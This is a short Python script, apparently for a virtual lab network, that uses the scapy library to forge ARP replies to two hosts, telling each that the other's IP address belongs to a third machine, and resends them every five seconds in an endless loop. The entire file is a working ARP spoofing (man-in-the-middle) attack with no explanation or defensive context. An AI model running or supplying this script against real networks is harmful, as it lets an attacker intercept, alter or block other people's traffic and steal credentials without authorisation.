from scapy.all import *
import time

arp1 = ARP(op=2,pdst="192.168.56.101",psrc="192.168.56.102",hwsrc="08:00:27:9e:71:50")
arp2 = ARP(op=2,pdst="192.168.56.102",psrc="192.168.56.101",hwsrc="08:00:27:9e:71:50")

while True:
    send(arp1)
    send(arp2)
    time.sleep(5)
